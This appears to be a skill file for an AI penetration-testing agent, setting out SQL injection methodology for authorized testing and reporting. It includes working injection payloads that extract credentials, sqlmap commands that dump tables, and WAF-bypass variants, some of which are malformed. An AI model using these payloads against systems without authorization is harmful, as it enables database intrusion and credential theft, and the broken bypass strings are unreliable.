---
name: sql-injection-testing
description: Professional skills and methodology for SQL injection testing
version: 1.0.0
---

# SQL Injection Testing Skills

## Overview

SQL injection is a common and dangerous Web application vulnerability. This skill provides a systematic SQL injection testing methodology, detection techniques, and exploitation strategies.

## Test Method

### 1. Parameter Identification
- Identification of all user input points: URL parameters, POST data, HTTP header, Cookie, etc.
- Focus on parameters such as id, search, filter, and sort.
- Interception and modification of requests using Burp Suite or similar tools

### 2. Basic Detection
- Single Quote Test: `'` - See if there was a SQL error
- Boolean blind injection: `' AND '1'='1` vs `' AND '1'='2`
- Time-based blind injection: `' AND SLEEP(5)--`
- UNION query: `' UNION SELECT NULL--`

### 3. Database Identification
- MySQL:`' AND @@version LIKE '%mysql%'--`
- PostgreSQL:`' AND version() LIKE '%PostgreSQL%'--`
- MSSQL:`' AND @@version LIKE '%Microsoft%'--`
- Oracle: `' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE '%Oracle%'--`

### 4. Information extraction
- Database name: `' UNION SELECT database()--`
- Table name: `' UNION SELECT table_name FROM information_schema.tables--`
- List: `' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--`
- Data extraction: `' UNION SELECT username,password FROM users--`

## Using the Tools

### sqlmap
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# Specify parameters
sqlmap -u "http://target.com/page" --data="id=1" --method=POST

# Specify Database Type
sqlmap -u "http://target.com/page?id=1" --dbms=mysql

# Retrieve Database List
sqlmap -u "http://target.com/page?id=1" --dbs

# Fetch Table
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Access to data
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump
```

### Manual Testing
- Use Repeater module for Burp Suite
- Use browser developers tool
- Preparation of automated testing of Python scripts

## Bypass Techniques

### WAF Bypass
- Encoding bypass: URL, Unicode, hexadecimal
- Comment bypassed: `/**/`, `--`, `#`
- Case mixed: `SeLeCt`, `UnIoN`
- Space replacement: `/**/`, `+`, `%09` (Tab), `%0A` (line break)

### Example
```
Origanal:'UNION SELECT NULL...
Bypass1:'/**/UNION/**/SELECT/**/NULL--
Bypass2:'%55non%20select%20null...
Bypass3:'/*! UNION*/*! SELECT*/null...
```

## Verification and Reporting

### Verification Steps
1. Confirm that you can execute the SQL statement
2. Validation for extracting database information
3. Assessment of the scope of the impact (data leakage, enhanced authority, etc.)
4. Record the complete POC (request/response)
5. Enter identified vulnerabilities into the platform (the only entry to the Platform 's recorded vulnerabilities) through the `report_finding` tool, with fields covering location, type, severity, recovery steps/PoC and recommendations for restoration

### Reporting Checklist
- Lacunae position and parameters
- Data and systems of impact
- Complete Utilization Steps
- Remediation recommendations (parametric queries, input validation, etc.)

## Important Notes

- Perform only in an authorized testing environment
- Avoid damage to production data
- Use dangerous operations like DROP, DELETE, etc. with care
- Record all test steps to repeat
